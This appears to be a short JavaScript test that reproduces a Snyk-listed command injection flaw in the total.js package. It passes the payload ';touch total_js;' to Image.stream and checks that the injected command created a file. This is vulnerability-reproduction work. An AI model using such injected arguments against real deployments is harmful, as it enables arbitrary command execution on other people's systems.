//https://snyk.io/vuln/SNYK-JS-TOTALJS-1046672
test("Command Injection in total.js", () => {
  const total = require("total.js");
  const fs = require("fs");
  const path = "./total_js";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let image = Image.load("");
  let payload = ";touch total_js;";
  image.stream(payload);
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
